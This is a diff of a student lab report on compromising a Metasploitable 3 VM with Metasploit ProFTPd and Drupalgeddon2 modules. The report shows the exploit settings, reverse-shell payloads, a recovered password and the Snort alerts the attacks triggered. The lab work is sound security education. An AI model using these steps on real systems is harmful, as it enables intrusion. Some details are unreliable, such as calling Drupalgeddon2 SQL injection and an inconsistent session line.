@@ -1,4 +1,4 @@
-To see a more detailed explanation of the project, please visit the repository:
+To see a more detailed explanation of the project, please visit the repository. Here I have omitted outputs, details and one attack that I did not manage to do to stay within the word limit, apart from that in GitHub the report is formatted and not in plain text.
 https://github.com/LittleHaku/cybersecurity-proj2
 
 This project's goal is to learn how to compromise a virtual machine that is running Metasploitable 3 and Snort to detect possible attacks, the Snort rules that I used were the ones that are given in the snort.conf file in the course. Five attacks will be performed, three of them will be recognized by Snort, but the other two will not be identified.
@@ -19,10 +19,37 @@ The output of the command can be seen in the repository, since we have to stay w
 
 Identified Attack 1: ProFTPd
 
-Port 21 is open and running ProFTPd 1.3.5, so the first thing we do is search in Metasploit for scripts that match the service and version. From the list we select "exploit/unix/ftp/proftpd_modcopy_exec" due to its excellent rank and coincidence with version 1.3.5, we configure its options and run the exploit to see that it failed. Then we try to use a different payload "cmd/unix/reverse_perl" and repeat. This time the exploit works and we get a shell.
+Port 21 is open and running ProFTPd 1.3.5, so the first thing we do is search in Metasploit for scripts that match the service and version. From the list we select "exploit/unix/ftp/proftpd_modcopy_exec" due to its excellent rank and coincidence with version 1.3.5, we configure its options and run the exploit
+
+set rhosts 172.28.128.3
+set sitepath /var/www/html
+exploit
+
+It failed. Then we try to use a different payload "cmd/unix/reverse_perl" and repeat. This time the exploit works and we get a shell.
 
 With the obtained shell, we see the different files that are in the directory and we see a file named "payroll_app.php" which we examine and see that it contains a chunk of code that validates the user and password, so we now have some credentials that may be useful later (root:sploitme).
 
 Also, we can see that the attack was detected by Snort as a priority 1 attack:
 
 11/16-16:31:14.340657  [**] [1:1356:5] WEB-ATTACKS perl execution attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:40327 -> 172.28.128.3:80
+
+Identified attack 2: Drupal
+
+During the second Nmap scan, a folder named Drupal was discovered on port 80. Subsequently, an exploration into potential exploits for Drupal was initiated using the Metasploit framework:
+
+The search revealed several modules tailored for Drupal, among which "exploit/unix/webapp/drupal_drupalgeddon2" was chosen due to its excellent rank and the use of SQL injection. Numerous payloads were available, with the selected payload being number 18 (php/meterpreter/reverse_tcp). The necessary parameters, such as the target IP (RHOSTS) and the target URI (TARGETURI), were configured, and the exploit was executed
+
+set RHOSTS 172.28.128.3
+set TARGETURI /drupal/
+execute
+
+It was a successful execution and now we have granted ourselves a Meterpreter shell:
+
+[*] Meterpreter session 7 opened (192.168.0.104:4444 -> 192.168.0.104:54896) at 2023-11-19 23:24:17 +0200
+
+meterpreter > getuid
+Server username: www-data
+
+From the VM, we can see that the attack was detected by Snort as a priority 1 attack:
+
+[**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:43547 -> 172.28.128.3:80
